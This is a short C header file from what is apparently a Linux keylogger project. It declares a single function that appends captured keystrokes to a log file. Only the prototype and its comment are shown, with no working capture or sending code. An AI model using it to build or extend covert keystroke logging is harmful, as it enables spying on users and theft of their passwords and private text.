/* file_handler.h */
#ifndef LINUX_KEYLOGGER_FILE_HANDLER_H
#define LINUX_KEYLOGGER_FILE_HANDLER_H


/**
 * This function appends the new keys, in the logg file.
 * @param file The location of the log file.
 * @param what_to_append The data to be appended in the log file.
 * @return -1 on error or 0 on success.
 */
int append_to_file(const char *file, const char *what_to_append);


#endif
